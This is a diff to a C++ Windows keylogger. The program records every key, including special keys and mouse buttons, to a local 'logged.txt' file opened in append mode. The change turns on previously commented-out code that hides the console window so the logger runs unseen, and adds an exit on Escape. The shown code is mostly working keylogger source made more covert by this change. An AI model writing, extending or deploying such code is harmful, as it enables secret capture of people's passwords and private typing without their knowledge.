@@ -8,7 +8,7 @@
 using namespace std;
 
 #define LOG_FILE "logged.txt"
-ofstream outputLog (LOG_FILE);
+ofstream outputLog;
 
 string outputSpecialKey(char key) {
     string result;
@@ -60,12 +60,16 @@ string outputSpecialKey(char key) {
 
 int main()
 {
+    // array of special keys declared by Win32 header
     int specialKeys[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB,
         VK_CONTROL, VK_MENU, VK_CAPITAL, VK_DELETE, VK_ESCAPE, VK_LBUTTON,
         VK_RBUTTON};
+    // ios::app declares append mode
+    outputLog.open(LOG_FILE, ios::app);
 
-    // HWND hwnd = GetConsoleWindow();
-    // ShowWindow(hwnd, SW_HIDE);
+    // hide the terminal
+    HWND hwnd = GetConsoleWindow();
+    ShowWindow(hwnd, SW_HIDE);
 
     while (true) {
         time_t current = time(0);
@@ -77,6 +81,10 @@ int main()
 
                 // check if special key was detected
                 if (count(begin(specialKeys), end(specialKeys), key) > 0) {
+                    // EARLY EXIT by pressing escape
+                    if (key == VK_ESCAPE) {
+                        return 0;
+                    }
                     output = outputSpecialKey((char)key);
                 // else, normal key was pressed
                 } else {
